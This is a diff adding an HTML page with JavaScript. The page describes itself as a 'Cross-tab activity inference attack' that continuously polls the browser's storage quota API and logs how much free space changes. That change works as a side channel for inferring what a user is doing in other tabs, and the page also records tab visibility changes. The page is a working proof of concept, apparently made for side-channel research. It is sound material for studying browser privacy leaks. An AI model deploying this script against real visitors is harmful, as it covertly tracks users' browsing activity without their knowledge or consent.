@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+   <style type='text/css'>
+	* { font-family: 'Times New Roman', 'Times', serif; }
+	h1 { color: darkslateblue;}
+	h2 { color: darkslateblue;}
+	h3 { color: darkslateblue;}
+   </style>
+	
+  <title>Quota API</title>
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
+
+<script>
+
+var count=0;
+var firstValue=0;
+var space=0;
+
+function getHiddenProp(){
+    var prefixes = ['webkit','moz','ms','o'];
+    
+    // if 'hidden' is natively supported just return it
+    if ('hidden' in document) return 'hidden';
+    
+    // otherwise loop over all the known prefixes until we find one
+    for (var i = 0; i < prefixes.length; i++){
+        if ((prefixes[i] + 'Hidden') in document) 
+            return prefixes[i] + 'Hidden';
+    }
+
+    // otherwise it's not supported
+    return null;
+}
+
+function isHidden() {
+    var prop = getHiddenProp();
+    if (!prop) return false;
+    
+    return document[prop];
+}
+
+// use the property name to generate the prefixed event name
+var visProp = getHiddenProp();
+if (visProp) {
+  var evtname = visProp.replace(/[H|h]idden/,'') + 'visibilitychange';
+  document.addEventListener(evtname, visChange);
+}
+
+function visChange() {
+   var txtFld = document.querySelector("#space");
+
+   if (txtFld) {
+      if (isHidden())
+      {
+         txtFld.value += "Tab Hidden!\n";
+	 showFreeSpace();
+      }
+      else
+         txtFld.value += "Tab Visible!\n";
+   }
+}
+
+showFreeSpace();
+	
+// Milliseconds
+function sleep_ms(millisecs) {
+var initiation = new Date().getTime();
+while ((new Date().getTime() - initiation) < millisecs);
+}
+
+//Quota API
+function showFreeSpace() {
+  // Request storage usage and capacity left
+  // the type can be either TEMPORARY or PERSISTENT
+  //sleep_ms(100);
+  navigator.webkitTemporaryStorage.queryUsageAndQuota(onSuccess, onError);  
+}
+
+function onSuccess(usedSpace, remainingSpace) {
+  
+  var displaySpace = document.querySelector("#space");
+  var differ=0;
+  var reduced_quota=0;
+
+  count++;
+ 
+  if(count == 1)
+  {
+    firstValue = remainingSpace;    
+  }
+  if(space != remainingSpace)
+  {	  
+    space = remainingSpace;
+    differ = firstValue-remainingSpace;
+    reduced_quota = eval(differ/1024);
+
+    displaySpace.innerHTML += "remaining space" + " = " + remainingSpace + "Byte" + ", reduced quota = " + reduced_quota + "KiB" + "<br>";
+    
+    document.body.scrollTop = document.body.scrollHeight;
+  }
+    showFreeSpace();
+}
+
+function onError(error) {
+  console.log('Error', error); 
+}
+
+function enter() {
+  var displaySpace = document.querySelector("#space");
+  displaySpace.innerHTML += "<br>";
+}
+
+function writeURL() {
+  var displaySpace = document.querySelector("#url");
+  displaySpace.innerHTML = window.location.href;
+}
+
+</script>
+
+</head>
+<body onload="writeURL()">
+
+<p><h1 align="center">Cross-tab activity inference attack</h1></p>
+<p><h2>- Attack script continuously monitors your's free storage space in this web browser.</h2></p>
+
+<button onclick="enter()">Enter</button>
+
+
+</body> 
+  <br>
+  <div id="url"></div>
+  <br><br>
+  <div id="space"></div>
+</html>
